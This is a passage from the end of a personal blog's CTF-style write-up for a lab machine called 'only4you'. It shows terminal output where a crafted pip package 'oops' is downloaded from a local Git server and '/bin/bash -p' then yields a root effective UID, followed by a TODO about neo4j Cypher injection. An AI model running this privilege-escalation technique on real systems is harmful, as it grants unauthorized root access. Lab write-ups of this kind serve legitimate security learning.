</span></span><span style=display:flex><span>  Downloading http://127.0.0.1:3000/john/oops/raw/master/oops-0.0.1.tar.gz (<span style=color:#0086f7;font-weight:700>847</span> bytes)
</span></span><span style=display:flex><span>  Saved ./oops-0.0.1.tar.gz
</span></span><span style=display:flex><span>Successfully downloaded oops
</span></span><span style=display:flex><span>john@only4you:/etc/nginx/sites-enabled$ /bin/bash -p
</span></span><span style=display:flex><span>bash-5.0# id
</span></span><span style=display:flex><span><span style=color:#fb660a>uid</span>=1000(john) <span style=color:#fb660a>gid</span>=1000(john) <span style=color:#fb660a>euid</span>=0(root) <span style=color:#fb660a>egid</span>=0(root) <span style=color:#fb660a>groups</span>=0(root),1000(john)
</span></span><span style=display:flex><span>bash-5.0#
</span></span></code></pre></div><h2 id=todos>TODOs
<a class=heading-link href=#todos><i class="fa fa-link" aria-hidden=true></i></a></h2><ul><li>Review in depth neo4j cypher sqli</li></ul><p>Thanks 4 reading!</p></article></section></div><footer class=footer><section class=container>©
2021 -
2024
Dennis Ruiz
·
Powered by <a href=https://gohugo.io/>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/>Coder</a>.</section></footer></main><script src=/js/coder.min.236049395dc3682fb2719640872958e12f1f24067bb09c327b233e6290c7edac.js integrity="sha256-I2BJOV3DaC+ycZZAhylY4S8fJAZ7sJwyeyM+YpDH7aw="></script><script async src="https://www.googletagmanager.com/gtag/js?id=G-6CQZY8W0WD"></script><script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6CQZY8W0WD")</script><script>$(document).on("input propertychange paste change",".FilterSearch",function(){var n=$(this).val().toLowerCase(),s=$(this).closest("ul"),t=s.find("li:gt(0)");t.hide(),t.filter(function(){var e=$(this).text().toLowerCase();return e.indexOf(n)>=0}).show()})</script></body></html>